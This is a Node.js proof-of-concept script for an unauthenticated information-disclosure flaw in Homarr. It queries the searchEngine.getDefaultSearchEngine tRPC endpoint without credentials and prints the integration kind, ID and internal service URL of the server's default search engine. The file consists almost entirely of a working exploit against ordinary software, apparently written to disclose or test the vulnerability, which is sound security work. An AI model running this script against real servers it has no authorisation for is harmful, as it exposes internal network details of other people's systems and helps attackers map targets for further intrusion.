#!/usr/bin/env node
/**
 * PoC — Homarr unauthenticated integration internal-URL disclosure
 * Endpoint: searchEngine.getDefaultSearchEngine (publicProcedure, tRPC only)
 *
 * Usage:  node poc-02-getDefaultSearchEngine.mjs https://your-homarr-host
 * Sends NO credentials. Prints the leaked integration {kind,url,id} if the
 * server's DEFAULT search engine is integration-backed (type "fromIntegration").
 */
const base = (process.argv[2] || process.env.HOMARR_URL || "http://localhost:7575").replace(/\/$/, "");
const input = encodeURIComponent(JSON.stringify({ "0": { json: null } }));
const url = `${base}/api/trpc/searchEngine.getDefaultSearchEngine?batch=1&input=${input}`;

const res = await fetch(url);                 // no cookie, no x-api-key
const text = await res.text();
let engine = null;
try { const p = JSON.parse(text); engine = Array.isArray(p) ? (p[0]?.result?.data?.json ?? p[0]?.result?.data) : p; } catch {}

console.log(`GET ${url}`);
console.log(`HTTP ${res.status} (sent no auth)`);
if (engine && engine.integration && engine.integration.url) {
  console.log(">>> LEAKED integration metadata to an UNAUTHENTICATED caller:");
  console.log(`    default search engine : ${engine.name} (${engine.type})`);
  console.log(`    integration.kind      : ${engine.integration.kind}`);
  console.log(`    integration.url       : ${engine.integration.url}   <-- internal service URL`);
  console.log(`    integration.id        : ${engine.integration.id}`);
} else {
  console.log("no integration metadata in response");
  console.log("(demonstrate by setting an integration-backed engine, e.g. SearXNG, as the server default)");
  console.log("raw:", text.slice(0, 300));
}
